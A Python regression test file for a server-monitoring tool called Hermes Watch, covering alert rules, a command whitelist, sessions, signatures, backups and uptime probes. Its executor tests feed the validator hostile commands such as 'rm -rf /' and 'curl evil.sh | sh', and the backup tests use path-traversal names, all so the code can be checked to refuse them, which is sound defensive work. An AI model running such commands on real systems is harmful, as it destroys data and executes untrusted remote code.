"""Hermes Watch 回归测试：无框架，`py run_tests.py` 直接跑，全绿 = 通过。

覆盖：规则引擎阈值/评分、提案白名单、口令与会话、agent 验签、凭据加密、
LLM 叙事卡片结构。全部针对当前 SQLite 演示库，只读 + 测试数据自清理。
"""
import asyncio
import sys
import time

sys.path.insert(0, ".")
from app import agent, analysis, auth, collector, db, executor, notify, rules, secrets as sec  # noqa: E402

PASS = 0
FAIL = 0


def check(name, cond, detail=""):
    global PASS, FAIL
    if cond:
        PASS += 1
        print(f"  ok  {name}")
    else:
        FAIL += 1
        print(f" FAIL {name}  {detail}")


def t_rules():
    print("[rules]")
    T = rules.thresholds()
    check("默认阈值加载", T["disk_warn"] == 85 and T["cert_days"] == 14)

    host = {"id": 0}
    none_ = rules.evaluate(host, {"disk": 50, "mem": 50, "cpu": 10, "load1": 0.5}, {})
    check("正常指标无发现", none_ == [])

    f = rules.evaluate(host, {"disk": 96, "mem": 50, "cpu": 10, "load1": 0.5}, {})
    check("磁盘 96% → crit", any(x["type"] == "disk" and x["severity"] == "crit" for x in f))
    f = rules.evaluate(host, {"disk": 86, "mem": 50, "cpu": 10, "load1": 0.5}, {})
    check("磁盘 86% → warn", any(x["type"] == "disk" and x["severity"] == "warn" for x in f))

    f = rules.evaluate(host, {"disk": 50, "mem": 93, "cpu": 10, "load1": 0.5}, {})
    check("内存 93% → crit", any(x["type"] == "memory" and x["severity"] == "crit" for x in f))

    f = rules.evaluate(host, {"disk": 50, "mem": 50, "cpu": 90, "load1": 9}, {})
    check("CPU 90 + load 9 → 双 warn", {x["type"] for x in f} == {"cpu", "load"})

    f = rules.evaluate(host, {"disk": 50, "mem": 50, "cpu": 10, "load1": 1}, {
        "failed_services": ["nginx.service"],
        "suspicious_logins": [{"user": "root", "ip": "1.2.3.4"}],
        "cert_days_left": 5,
    })
    types = {x["type"]: x["severity"] for x in f}
    check("extras → service/login/cert 发现",
          types.get("service") == "crit" and types.get("login") == "crit" and types.get("cert") == "warn")

    # 容器监控:非 running 触发 container 发现(running/restarting/paused 不触发,dead 更严)
    f2 = rules.evaluate({"id": 1}, {"disk": 10, "mem": 10, "cpu": 10, "load1": 0.5}, {
        "docker_containers": [
            {"name": "db", "state": "exited", "status": "Exited (137) 2h ago", "image": "postgres:16"},
            {"name": "cache", "state": "running", "status": "Up 3 days", "image": "redis"},
            {"name": "worker", "state": "restarting", "status": "Restarting", "image": "w"},
            {"name": "bad", "state": "dead", "status": "Dead", "image": "b"},
        ]})
    ct = {x["title"]: x["severity"] for x in f2 if x["type"] == "container"}
    check("容器发现:exited 警告/dead 严重/running 忽略",
          len(ct) == 2 and any(v == "warn" for v in ct.values()) and any(v == "crit" for v in ct.values()))
    check("容器发现标题带名字与状态", any("db" in k and "exited" in k for k in ct))

    check("健康分: 无发现=100", rules.health_score([]) == 100)
    # 类型权重：安全类重（login crit −30）、性能噪声类轻（cpu warn −4）
    check("健康分: 类型权重 login crit 扣 30",
          rules.health_score([{"severity": "crit", "type": "login"}]) == 70)
    check("健康分: 类型权重 memory crit 扣 24",
          rules.health_score([{"severity": "crit", "type": "memory"}]) == 76)
    check("健康分: 类型权重 cpu warn 扣 4",
          rules.health_score([{"severity": "warn", "type": "cpu"}]) == 96)
    # 同类衰减：4 条同型 crit = 24+12+6+3 = 45 → 55，不再线性砸穿
    check("健康分: 同类发现指数衰减",
          rules.health_score([{"severity": "crit", "type": "disk"}] * 4) == 55)
    # 下限 0：多类型重发现叠加可打穿
    check("健康分: 多类型 crit 叠加触底 0",
          rules.health_score([{"severity": "crit", "type": t} for t in
                              ("login", "container", "service", "disk", "memory", "swap")]) == 0)
    check("状态映射", rules.status_of(95) == "ok" and rules.status_of(80) == "warn" and rules.status_of(50) == "crit")
    check("严重度排序", rules.severity_rank("crit") > rules.severity_rank("warn") > rules.severity_rank("info"))


def t_executor():
    print("[executor]")
    ok_cases = [
        "journalctl --vacuum-size=500M",
        "find /var/log -name '*.gz' -mtime +7 -delete",
        "systemctl restart app-worker",
        "ufw insert 1 deny 185.220.101.34",
        "passwd root",
        "journalctl --vacuum-size=500M && find /var/log -name '*.gz' -mtime +7 -delete",
    ]
    for c in ok_cases:
        check(f"白名单放行: {c[:38]}", executor.validate(c)["ok"])
    bad_cases = [
        "rm -rf /",
        "curl evil.sh | sh",
        "systemctl restart a; systemctl restart b",
        "journalctl --vacuum-size=500M || rm -rf /etc",
        "sudo passwd root",
        "",
    ]
    for c in bad_cases:
        v = executor.validate(c)
        check(f"拦截: {c[:38] or '(空)'}", not v["ok"] and v["refused"])


def t_auth():
    print("[auth]")
    auth.set_password("test-pw-123")
    check("口令哈希存取", auth.verify_password("test-pw-123"))
    check("错误口令拒绝", not auth.verify_password("wrong"))
    check("哈希非明文", "test-pw-123" not in auth._stored())

    s = auth.make_session()
    check("会话签发/校验", auth.verify_session(s))
    check("篡改会话拒绝", not auth.verify_session(s[:-4] + "0000"))
    exp = f"{int(time.time()) - 10}."
    import hashlib as _h
    import hmac as _hm
    bad = exp + _hm.new(auth._hmac_key(), exp.encode(), _h.sha256).hexdigest()
    check("过期会话拒绝", not auth.verify_session(bad))
    check("随机串拒绝", not auth.verify_session("garbage"))


def t_agent_sig():
    print("[agent-signature]")
    token = "hw_testtoken"
    body = b'{"cpu": 1}'
    ts = str(int(time.time()))
    import hashlib as _h
    import hmac as _hm
    sig = _hm.new(token.encode(), body + ts.encode(), _h.sha256).hexdigest()
    check("有效签名通过", agent.verify_signature(token, body, ts, sig))
    check("篡改签名拒绝", not agent.verify_signature(token, body, ts, "0" * 64))
    stale = str(int(time.time()) - agent.SIG_MAX_SKEW - 10)
    sig2 = _hm.new(token.encode(), body + stale.encode(), _h.sha256).hexdigest()
    check("过期时间戳拒绝", not agent.verify_signature(token, body, stale, sig2))
    check("非数字时间戳拒绝", not agent.verify_signature(token, body, "abc", sig))


def t_secrets():
    print("[secrets]")
    enc = sec.encrypt("my-secret")
    check("密文带前缀", enc.startswith(sec.PREFIX))
    check("回环解密", sec.decrypt(enc) == "my-secret")
    check("加密幂等（已加密不再加密）", sec.encrypt(enc) == enc)
    check("明文兼容读取", sec.decrypt("legacy-plain") == "legacy-plain")
    check("空值安全", sec.decrypt("") == "" and sec.decrypt(None) == "")
    m = collector.parse_probe("cpu=3\nnet_in=100 net_out=200\ndisk=55")
    check("探针解析: 单行多 k=v", m.get("net_in") == 100 and m.get("net_out") == 200)
    check("探针解析: 单键行", m.get("cpu") == 3 and m.get("disk") == 55)


def t_analysis_card():
    print("[analysis-card]")
    h = db.query_one("SELECT * FROM hosts LIMIT 1")
    tmp_hid = None
    if not h:  # 全新库（CI/空数据目录）没有演示主机：临时补一颗 mock 主机（不碰 SSH），结束清理
        tmp_hid = db.execute(
            "INSERT INTO hosts(name,hostname,group_name,mock,created_at) VALUES('__t_diag__','x','t',1,?)",
            (db.now(),))
        h = db.query_one("SELECT * FROM hosts WHERE id=?", (tmp_hid,))
    fid = db.execute(
        "INSERT INTO findings(host_id,ts,type,severity,title,detail,evidence) VALUES(?,?,?,?,?,?,?)",
        (h["id"], db.now(), "cpu", "warn", "【测试】CPU 90%", "test", "{}"))
    f = db.query_one("SELECT * FROM findings WHERE id=?", (fid,))
    card = asyncio.run(analysis.analyze_finding(h, f))
    check("卡片含规则结论", bool(card["root_cause"]))
    check("AI 默认关 → 无叙事", card["ai_narration"] is None and card["ai_error"] is None)
    check("字段齐备", all(k in card for k in ("chain", "confidence", "steps", "proposal_id",
                                              "ai_narration", "ai_model", "ai_error")))
    db.execute("DELETE FROM findings WHERE id=?", (fid,))
    if card["proposal_id"]:
        db.execute("DELETE FROM proposals WHERE id=?", (card["proposal_id"],))
    if tmp_hid is not None:
        db.execute("DELETE FROM hosts WHERE id=?", (tmp_hid,))


def t_session_epoch():
    print("[session-epoch]")
    auth.set_password("epoch-pw-1")
    s1 = auth.make_session()
    check("epoch 会话签发/校验", auth.verify_session(s1))
    auth.bump_session_epoch()
    check("epoch 递增后旧会话作废", not auth.verify_session(s1))
    s2 = auth.make_session()
    check("新 epoch 会话有效", auth.verify_session(s2))


def t_recovery():
    print("[recovery]")
    from app import scheduler
    hid = db.execute(
        "INSERT INTO hosts(name,hostname,group_name,mock,created_at) VALUES('__t_rec__','x','t',1,?)",
        (db.now(),))
    fid = db.execute(
        "INSERT INTO findings(host_id,ts,type,severity,title,detail,evidence) VALUES(?,?,?,?,?,?,?)",
        (hid, db.now(), "disk", "warn", "【测试】磁盘告警", "test", "{}"))
    # 仍在触发 → 计数清零
    scheduler._check_recovery(hid, {"disk"})
    check("触发中不恢复", db.query_one("SELECT status FROM findings WHERE id=?", (fid,))["status"] == "open")
    # 条件解除，连续 3 轮
    scheduler._check_recovery(hid, set())
    scheduler._check_recovery(hid, set())
    check("未满轮次不恢复", db.query_one("SELECT status FROM findings WHERE id=?", (fid,))["status"] == "open")
    scheduler._check_recovery(hid, set())
    row = db.query_one("SELECT status, resolved_at FROM findings WHERE id=?", (fid,))
    check("满 3 轮自动恢复", row["status"] == "resolved" and row["resolved_at"])
    ev = db.query_one("SELECT message FROM events WHERE host_id=? AND kind='ok'", (hid,))
    check("恢复事件已记录", bool(ev))
    db.execute("DELETE FROM events WHERE host_id=?", (hid,))
    db.execute("DELETE FROM findings WHERE id=?", (fid,))
    db.execute("DELETE FROM hosts WHERE id=?", (hid,))


def t_offline():
    print("[offline]")
    from app import analysis
    hid = db.execute(
        "INSERT INTO hosts(name,hostname,group_name,mock,created_at,last_ok_ts) "
        "VALUES('__t_off__','x','t',1,?,?)", (db.now(), db.now() - 3600))
    snap = analysis.fleet_snapshot()
    h = next(x for x in snap["hosts"] if x["id"] == hid)
    check("1 小时无采集 → 离线", h["status"] == "offline" and not h["online"])
    db.execute("UPDATE hosts SET last_ok_ts=? WHERE id=?", (db.now(), hid))
    snap = analysis.fleet_snapshot()
    h = next(x for x in snap["hosts"] if x["id"] == hid)
    check("刚刚采集 → 在线", h["online"] and h["status"] != "offline")
    db.execute("DELETE FROM hosts WHERE id=?", (hid,))


def t_nan_guard():
    print("[nan-guard]")
    import math
    class _Req:
        headers = {"x-hw-token": ""}
    # 端点内的防御逻辑等价复刻：NaN/inf → 0
    data = {"cpu": float("nan"), "mem": float("inf"), "disk": 55}
    def _num(k):
        v = float(data.get(k, 0) or 0)
        return v if math.isfinite(v) else 0.0
    m = {k: _num(k) for k in ("cpu", "mem", "disk")}
    check("NaN → 0", m["cpu"] == 0)
    check("inf → 0", m["mem"] == 0)
    check("正常值透传", m["disk"] == 55)


def t_hysteresis():
    print("[hysteresis]")
    hid = db.execute(
        "INSERT INTO hosts(name,hostname,group_name,mock,created_at) VALUES('__t_hys__','x','t',1,?)",
        (db.now(),))
    db.execute(
        "INSERT INTO findings(host_id,ts,type,severity,title,detail,evidence) VALUES(?,?,?,?,?,?,?)",
        (hid, db.now(), "disk", "warn", "【测试】磁盘告警", "test", "{}"))
    # 83 介于 clear(80) 与 warn(85) 之间：已有告警保持打开（滞后），不新触发也不恢复
    f = rules.evaluate({"id": hid}, {"disk": 83, "mem": 50, "cpu": 10, "load1": 0.5}, {})
    check("83% 仍判定活动（滞后保持）", any(x["type"] == "disk" for x in f))
    f = rules.evaluate({"id": hid}, {"disk": 78, "mem": 50, "cpu": 10, "load1": 0.5}, {})
    check("78% 低于 clear 线 → 解除", not any(x["type"] == "disk" for x in f))
    f = rules.evaluate({"id": hid}, {"disk": 86, "mem": 50, "cpu": 10, "load1": 0.5}, {})
    check("86% 越过 warn 线 → 触发", any(x["type"] == "disk" for x in f))
    db.execute("DELETE FROM findings WHERE host_id=?", (hid,))
    db.execute("DELETE FROM hosts WHERE id=?", (hid,))


def t_quiet_hours():
    print("[quiet-hours]")
    from app import notify
    check("空配置不命中", not notify.in_quiet_hours(""))
    check("非法格式不命中", not notify.in_quiet_hours("abc"))
    check("超界小时不命中", not notify.in_quiet_hours("25:00-08:00"))
    # 注入固定时刻验证窗口判定（monkeypatch datetime 模块内的 now 引用不可行，直接测纯逻辑）
    cases = [
        # (spec, 当前时分, 期望)
        ("23:00-08:00", 23 * 60 + 30, True),
        ("23:00-08:00", 12 * 60, False),
        ("23:00-08:00", 3 * 60, True),    # 跨午夜
        ("08:00-22:00", 10 * 60, True),
        ("08:00-22:00", 23 * 60, False),
    ]
    for spec, cur, want in cases:
        h1, m1, h2, m2 = (int(x) for x in spec.replace(":", " ").replace("-", " ").split())
        start, end = h1 * 60 + m1, h2 * 60 + m2
        if start <= end:
            got = start <= cur < end
        else:
            got = cur >= start or cur < end
        check(f"{spec} @ {cur // 60:02d}:{cur % 60:02d} → {want}", got == want)
    check("24:00 越界视作非法 → 任何时刻不命中", not notify.in_quiet_hours("00:00-24:00"))


def t_anonymize():
    print("[anonymize]")
    # 现场免疫：占位符跟随面板语言（hw_lang），备份现场值固定 zh，测完还原（测试库可能与运行面板共用）
    prev_lang = db.query_one("SELECT value FROM settings WHERE key='hw_lang'")
    db.execute("INSERT INTO settings(key,value) VALUES('hw_lang','zh') "
               "ON CONFLICT(key) DO UPDATE SET value=excluded.value")
    hid = db.execute(
        "INSERT INTO hosts(name,hostname,group_name,mock,created_at) VALUES('__t_anon__','192.168.7.7','t',1,?)",
        (db.now(),))
    mapping: dict[str, str] = {}
    out = analysis.anonymize("主机 __t_anon__ (192.168.7.7) 上 root 从 8.8.8.8 登录", mapping)
    check("主机名替换", "__t_anon__" not in out and "主机-" in out)
    check("主机地址替换", "192.168.7.7" not in out)
    check("用户名替换", "root" not in out)
    check("外部 IP 落 RFC5737", "8.8.8.8" not in out and "203.0.113." in out)
    check("映射一致（同输入同占位）", out == analysis.anonymize(
        "主机 __t_anon__ (192.168.7.7) 上 root 从 8.8.8.8 登录", dict(mapping)))
    db.execute("DELETE FROM hosts WHERE id=?", (hid,))
    if prev_lang:
        db.execute("UPDATE settings SET value=? WHERE key='hw_lang'", (prev_lang["value"],))
    else:
        db.execute("DELETE FROM settings WHERE key='hw_lang'")


def t_chat_stream_fallback():
    print("[chat-stream]")
    # 现场免疫：测试需要「AI 关」状态，备份现场值，测完还原（测试库可能与运行面板共用）
    prev = db.query_one("SELECT value FROM settings WHERE key='ai_outbound'")
    db.execute("INSERT INTO settings(key,value) VALUES('ai_outbound','off') "
               "ON CONFLICT(key) DO UPDATE SET value='off'")
    try:
        async def _run():
            chunks = [c async for c in analysis.chat_stream("现在整体情况？", [])]
            return chunks
        chunks = asyncio.run(_run())
    finally:
        if prev:
            db.execute("UPDATE settings SET value=? WHERE key='ai_outbound'", (prev["value"],))
    check("AI 关闭 → meta(rules)", chunks[0]["type"] == "meta" and chunks[0]["source"] == "rules")
    check("有正文 delta", any(c["type"] == "delta" and c.get("text") for c in chunks))
    check("以 done 结束", chunks[-1]["type"] == "done")


def t_notify_log():
    print("[notify-log]")
    ok, err = asyncio.run(notify.send("测试留痕", "notify-log test"))
    row = db.query_one(
        "SELECT * FROM notify_log WHERE kind='测试留痕' ORDER BY id DESC LIMIT 1")
    check("发送尝试已留痕", bool(row))
    check("未配置渠道 ok=0 error=未配置", row["ok"] == 0 and row["error"] == "未配置")


def t_backups():
    print("[backups]")
    import sqlite3
    import tempfile
    from pathlib import Path
    from app import backups
    # 残留免疫:上次 crash 可能留下标记
    marker = db._DATA_DIR / ".restore-pending"
    marker.unlink(missing_ok=True)

    # 真实在线备份（开发库,WAL 安全）
    info = backups.create_backup()
    p = backups.resolve_name(info["name"])
    check("在线备份落盘", bool(p) and p.exists() and info["size"] > 0)
    check("列表含新备份", any(b["name"] == info["name"] for b in backups.list_backups()))
    check("路径穿越拒绝", backups.resolve_name("../secret.db") is None
          and backups.resolve_name("x/../../etc.db") is None)

    # 暂存恢复:标记内容正确;不存在的备份拒绝
    check("暂存恢复标记", backups.stage_restore(info["name"]))
    check("标记内容正确", marker.exists()
          and marker.read_text(encoding="utf-8").strip() == info["name"])
    check("恢复不存在备份拒绝", not backups.stage_restore("hermes-watch-99999999-000000.db"))
    marker.unlink()  # 不真消费——真实库替换由重启路径验证,这里只测标记与注入路径

    # consume 注入临时目录:备份含 marker 表,还原后数据回到备份时点
    with tempfile.TemporaryDirectory() as td:
        d = Path(td)
        (d / "backups").mkdir()
        bname = "hermes-watch-20260910-000000.db"
        c = sqlite3.connect(d / "backups" / bname)
        c.execute("CREATE TABLE t(x)")
        c.execute("INSERT INTO t VALUES(42)")
        c.commit()
        c.close()
        target = d / "main.db"
        c2 = sqlite3.connect(target)
        c2.execute("CREATE TABLE t(x)")
        c2.execute("INSERT INTO t VALUES(0)")
        c2.commit()
        c2.close()
        (d / ".restore-pending").write_text(bname, encoding="utf-8")
        got = backups.consume_restore_if_pending(data_dir=d, db_path=target)
        con = sqlite3.connect(target)
        v = con.execute("SELECT x FROM t").fetchone()[0]
        con.close()
        check("消费标记→库还原到备份时点", got == bname and v == 42)
        check("消费后标记清除", not (d / ".restore-pending").exists())

    # 清理真实备份与记账(不留测试痕迹)
    if p:
        p.unlink()
    db.execute("DELETE FROM settings WHERE key='last_backup_ts'")


def t_probes():
    print("[probes]")
    from app import probes
    # 残留免疫：上次中途 crash 可能留下同名行（UNIQUE name），先清
    db.execute("DELETE FROM probes WHERE name='__t_probe__'")
    db.execute("DELETE FROM probe_log WHERE probe_id NOT IN (SELECT id FROM probes)")
    db.execute("DELETE FROM events WHERE kind='probe' AND message LIKE '%__t_probe__%'")
    # 现场免疫：占位/文案跟随面板语言，固定 zh 测模板断言，测完还原
    prev_lang = db.query_one("SELECT value FROM settings WHERE key='hw_lang'")
    db.execute("INSERT INTO settings(key,value) VALUES('hw_lang','zh') "
               "ON CONFLICT(key) DO UPDATE SET value=excluded.value")

    pid = db.execute(
        "INSERT INTO probes(name,kind,target,fail_threshold,success_threshold,timeout_s,"
        "up,fail_streak,succ_streak,created_at) VALUES('__t_probe__','url',"
        "'http://127.0.0.1:9',3,2,2,1,0,0,?)", (db.now(),))
    p = db.query_one("SELECT * FROM probes WHERE id=?", (pid,))

    # 真实拨测一个必然失败的端口（组合失败计数）——不依赖外网
    ok, latency, error = asyncio.run(probes.run_probe(
        {"kind": "tcp", "target": "127.0.0.1:9", "timeout_s": 1}))
    check("TCP 死端口判失败", not ok and error)
    ok2, latency2, _ = asyncio.run(probes.run_probe(
        {"kind": "url", "target": "https://127.0.0.1:9/x", "timeout_s": 1}))
    check("URL 死端口判失败", not ok2)

    # TCP 成功路径（本地起临时 echo 服务器，防回归：open_connection 元组解包）
    async def _tcp_ok():
        async def _handle(reader, writer):
            writer.close()
        server = await asyncio.start_server(_handle, "127.0.0.1", 0)
        port = server.sockets[0].getsockname()[1]
        try:
            return await probes.run_probe({"kind": "tcp", "target": f"127.0.0.1:{port}", "timeout_s": 3})
        finally:
            server.close()
    ok3, latency3, err3 = asyncio.run(_tcp_ok())
    check("TCP 连通判成功", ok3 and latency3 and latency3 > 0, err3)

    # ---- 条件引擎（url_check 纯函数）----
    p_url = {"keyword": "OK", "max_latency_ms": 300, "cert_days_min": 14}
    c_ok, c_err = probes.url_check(p_url, 200, "body OK here", 120.0, 30)
    check("条件全过", c_ok and c_err == "")
    c2, e2 = probes.url_check(p_url, 200, "no marker here", 120.0, 30)
    check("关键词缺失判失败", not c2 and "keyword missing" in e2)
    c3, e3 = probes.url_check(p_url, 200, "OK", 500.0, 30)
    check("响应超上限判失败", not c3 and "latency" in e3 and "500ms" in e3)
    c4, e4 = probes.url_check(p_url, 200, "OK", 120.0, 7)
    check("证书剩余不足判失败", not c4 and "7d" in e4 and "(< 14d)" in e4)
    c5, e5 = probes.url_check(p_url, 200, "OK", 120.0, None)
    check("证书读取失败判失败", not c5 and "could not read peer certificate" in e5)
    c6, _ = probes.url_check({"keyword": "", "max_latency_ms": 0, "cert_days_min": 0}, 500, "", 9000.0, None)
    check("无条件时仅看状态码", not c6)
    c7, _ = probes.url_check({"keyword": "OK"}, 200, "OK", 9000.0, None)
    check("条件缺省不拖累成功", c7)

    # SMTP URL 解析（Shoutrrr 式单字段）
    cfg = notify.parse_smtp_url("smtp://alert-bot:pw123@smtp.example.com:465?to=me@x.com&from=s@x.com")
    check("SMTP URL 解析", cfg["host"] == "smtp.example.com" and cfg["port"] == 465
          and cfg["user"] == "alert-bot" and cfg["password"] == "pw123"
          and cfg["to"] == "me@x.com" and cfg["from"] == "s@x.com")
    cfg2 = notify.parse_smtp_url("smtp://u@smtp.x.com?to=a@b.c")
    check("SMTP URL 缺省端口/发件人", cfg2["port"] == 587 and cfg2["from"] == "u" and cfg2["password"] == "")
    try:
        notify.parse_smtp_url("http://wrong")
        check("SMTP 非法 scheme 拒绝", False)
    except ValueError:
        check("SMTP 非法 scheme 拒绝", True)

    # 新通知渠道登记完整性（LABELS 是渠道白名单,conf 校验用）
    check("新渠道已登记", all(k in notify.LABELS for k in ("discord", "slack", "ntfy", "smtp")))

    # 状态机：up 中 2 次失败不打翻（防抖），第 3 次才 down
    r1 = probes.evaluate(p, False)
    p = db.query_one("SELECT * FROM probes WHERE id=?", (pid,))
    r2 = probes.evaluate(p, False)
    p = db.query_one("SELECT * FROM probes WHERE id=?", (pid,))
    check("两次失败未翻转", r1 is None and r2 is None and p["up"] == 1)
    r3 = probes.evaluate(p, False)
    check("连续 3 次失败 → down", r3 == "down")
    p = db.query_one("SELECT * FROM probes WHERE id=?", (pid,))
    check("down 后 fail_streak 保持", p["up"] == 0 and p["fail_streak"] >= 3)

    # down 中 1 次成功不恢复（success_threshold=2），第 2 次才 up
    p["_latency"], p["_error"] = 12.3, ""
    s1 = probes.evaluate(p, True)
    p = db.query_one("SELECT * FROM probes WHERE id=?", (pid,))
    s2 = probes.evaluate(p, True)
    check("一次成功未恢复", s1 is None)
    check("连续 2 次成功 → up", s2 == "up")
    p = db.query_one("SELECT * FROM probes WHERE id=?", (pid,))
    check("恢复后 streak 清零", p["up"] == 1 and p["fail_streak"] == 0)

    # handle_result: 翻转落事件 + 心跳留痕（notify 未配置只留痕不外呼）。
    # 状态机要求连续 fail_threshold 次失败才翻转，先压 2 次失败再走 handle_result 第 3 次
    p = db.query_one("SELECT * FROM probes WHERE id=?", (pid,))
    p["_latency"], p["_error"] = None, "ECONNREFUSED"
    probes.evaluate(p, False)
    p = db.query_one("SELECT * FROM probes WHERE id=?", (pid,))
    p["_latency"], p["_error"] = None, "ECONNREFUSED"
    probes.evaluate(p, False)
    p = db.query_one("SELECT * FROM probes WHERE id=?", (pid,))
    asyncio.run(probes.handle_result(p, False, None, "ECONNREFUSED"))
    ev = db.query_one("SELECT message FROM events WHERE kind='probe' ORDER BY id DESC LIMIT 1")
    check("下线翻转落事件", ev and ev["message"].startswith("拨测下线"))
    log = db.query_one("SELECT * FROM probe_log WHERE probe_id=? ORDER BY id DESC LIMIT 1", (pid,))
    check("心跳已留痕", log and log["up"] == 0 and log["error"] == "ECONNREFUSED")

    # 出口兜底:EN 语言下历史 zh 消息翻译
    db.execute("UPDATE settings SET value='en' WHERE key='hw_lang'")
    check("下线事件 EN 兜底", probes.tr_probe_message("拨测下线: x（y）— boom") == "Probe down: x（y）— boom")
    check("恢复事件 EN 兜底含时长归一",
          probes.tr_probe_message("拨测恢复: x（y，持续 5 分钟）") == "Probe recovered: x (y, was down for 5 min)")
    db.execute("UPDATE settings SET value='zh' WHERE key='hw_lang'")

    db.execute("DELETE FROM probes WHERE id=?", (pid,))
    db.execute("DELETE FROM probe_log WHERE probe_id=?", (pid,))
    db.execute("DELETE FROM events WHERE kind='probe' AND message LIKE '%__t_probe__%'")
    if prev_lang:
        db.execute("UPDATE settings SET value=? WHERE key='hw_lang'", (prev_lang["value"],))
    else:
        db.execute("DELETE FROM settings WHERE key='hw_lang'")


def t_probe_real_parallel():
    print("[probe-real]")
    from types import SimpleNamespace
    from app import collector, ssh

    class FakeSSHConn:
        def __init__(self):
            self.times = []

        async def run(self, cmd, check=False):
            t0 = time.monotonic()
            await asyncio.sleep(0.05)
            r = SimpleNamespace(stdout="")
            key = next((k for k, c in collector.DETAIL_PROBES.items() if c == cmd), None)
            if key == "cert":
                raise FileNotFoundError("openssl missing")  # 单探针失败不拖垮采集
            r.stdout = {
                "top_proc": "python3 50.0\n",
                "failed_services": "nginx.service\n",
                "ports": 'LISTEN 0 128 0.0.0.0:22 0.0.0.0:* users:(("sshd",pid=1,fd=3))',
                "docker": "db|exited|Exited (137) 2h ago|postgres:16\n",
            }.get(key, "cpu=12 mem=34 disk=56 net_in=100 net_out=200 load1=0.5")  # 基础探针/无匹配
            self.times.append((t0, time.monotonic()))
            return r

        def close(self):
            pass

    fake = FakeSSHConn()

    async def fake_connect(host, **kw):
        return fake

    orig = ssh.connect_async
    ssh.connect_async = fake_connect
    try:
        base, extras = asyncio.run(collector.probe_real({"id": 1, "hostname": "x", "port": 22}))
        check("基础指标解析", base.get("cpu") == 12 and base.get("net_in") == 100)
        check("六个 extras 探针并发全解析", extras["top_proc"] == "python3 50.0"
              and extras["failed_services"] == ["nginx.service"]
              and extras["docker_containers"][0]["name"] == "db"
              and extras["ports"][0]["port"] == 22)
        check("失败探针不拖垮其余（cert 保持 None）", extras["cert_days_left"] is None)
        span = max(e for _, e in fake.times) - min(s for s, _ in fake.times)
        check("探针真并发（总耗时远小于串行和）", span < 0.05 * len(fake.times) * 0.7)
    finally:
        ssh.connect_async = orig


def t_probe_parallel():
    print("[probe-parallel]")
    from app import probes
    db.execute("DELETE FROM probes WHERE name LIKE '__t_par%'")
    db.execute("DELETE FROM probe_log WHERE probe_id IN (SELECT id FROM probes WHERE name LIKE '__t_par%')")
    for i in range(2):
        db.execute(
            "INSERT INTO probes(name,kind,target,created_at) VALUES(?,?,?,?)",
            (f"__t_par{i}__", "url", "http://127.0.0.1:1/x", db.now()))  # last_ts 空 → 到期
    orig = probes.run_probe

    async def fake(p):
        await asyncio.sleep(0.05)
        return True, 5.0, ""

    probes.run_probe = fake
    try:
        asyncio.run(probes.run_due())
        rows = db.query("SELECT last_ts FROM probes WHERE name LIKE '__t_par%'")
        check("到期拨测并发全执行（两条都有新心跳时间）", len(rows) == 2 and all(r["last_ts"] for r in rows))
        # 再跑一轮：interval 内不到期，n 应为 0（push 清扫也无 push 目标）
        n = asyncio.run(probes.run_due())
        check("刚拨过不在到期窗口", n == 0)
    finally:
        probes.run_probe = orig
        db.execute("DELETE FROM probe_log WHERE probe_id IN (SELECT id FROM probes WHERE name LIKE '__t_par%')")
        db.execute("DELETE FROM probes WHERE name LIKE '__t_par%'")


def t_probe_dns_push():
    print("[probe-dns-push]")
    from app import probes
    # DNS 线格式：QNAME 编码 + QTYPE
    q = probes._build_query("example.com", 1, 0x426)
    check("DNS 查询报文含 QNAME+QTYPE", b"\x07example\x03com\x00" + (1).to_bytes(2, "big") in q)
    # 应答解析（手工拼报文：压缩指针 c0 0c 指回 Question 名，A 记录 93.184.216.34）
    header = (0x426).to_bytes(2, "big") + b"\x81\x80" + \
        (1).to_bytes(2, "big") + (1).to_bytes(2, "big") + b"\x00\x00\x00\x00"
    question = b"\x07example\x03com\x00" + (1).to_bytes(2, "big") + b"\x00\x01"
    answer = b"\xc0\x0c" + (1).to_bytes(2, "big") + b"\x00\x01" + b"\x00\x00\x00\x3c" + \
        (4).to_bytes(2, "big") + bytes([93, 184, 216, 34])
    answers = probes._parse_response(header + question + answer, 0x426)
    check("A 应答解析出 93.184.216.34", answers == ["93.184.216.34"])
    try:
        probes._parse_response(header[:10], 0x426)
        check("畸形应答报错", False)
    except ValueError:
        check("畸形应答报错", True)
    check("dns_check: 无记录失败", probes.dns_check([], "") == (False, "no records"))
    ok, err = probes.dns_check(["1.2.3.4"], "2.3.4")
    check("dns_check: 期望子串命中", ok and err == "")
    ok2, err2 = probes.dns_check(["1.2.3.4"], "9.9.9.9")
    check("dns_check: 期望未命中给原因", not ok2 and "9.9.9.9" in err2)
    name, used = probes._parse_name(b"\x03www\xc0\x0c", 0)
    check("压缩指针解析名称", name == "www" and used == 6)

    # Push 拨测：token 定位 + 上报维持 up + 超窗 sweep 翻 down
    db.execute("DELETE FROM probes WHERE name LIKE '__t_push%'")
    pid = db.execute(
        "INSERT INTO probes(name,kind,target,push_token,push_grace_s,created_at) "
        "VALUES('__t_push__','push','push','__t_ptok__',600,?)", (db.now(),))
    check("push token 定位", probes.push_report("__t_ptok__") == pid)
    check("无效 token 返回 None", probes.push_report("nope") is None)
    p = db.query_one("SELECT * FROM probes WHERE id=?", (pid,))
    asyncio.run(probes.handle_result(p, True, None, ""))
    p = db.query_one("SELECT * FROM probes WHERE id=?", (pid,))
    check("push 上报维持 up 且 last_ts 刷新", p["up"] == 1 and p["last_ts"] is not None)
    db.execute("UPDATE probes SET last_ts=? WHERE id=?", (db.now() - 700, pid))  # 超过 600s 容忍窗
    swept = asyncio.run(probes.sweep_push())
    p = db.query_one("SELECT * FROM probes WHERE id=?", (pid,))
    ev = db.query_one("SELECT message FROM events WHERE kind='probe' ORDER BY id DESC LIMIT 1")
    log = db.query_one("SELECT * FROM probe_log WHERE probe_id=? ORDER BY id DESC LIMIT 1", (pid,))
    check("超窗 sweep 翻 down", swept == 1 and p["up"] == 0)
    check("超窗事件与心跳留痕", ev and "push" in ev["message"] and log and log["up"] == 0)
    check("容忍窗口内不误杀", asyncio.run(probes.sweep_push()) == 0)  # 已 down，不再 sweep
    # 恢复：success_threshold 默认 2 次成功 → up
    p = db.query_one("SELECT * FROM probes WHERE id=?", (pid,))
    asyncio.run(probes.handle_result(p, True, None, ""))
    p = db.query_one("SELECT * FROM probes WHERE id=?", (pid,))
    asyncio.run(probes.handle_result(p, True, None, ""))
    p = db.query_one("SELECT * FROM probes WHERE id=?", (pid,))
    check("push 连续 2 次上报恢复 up", p["up"] == 1)
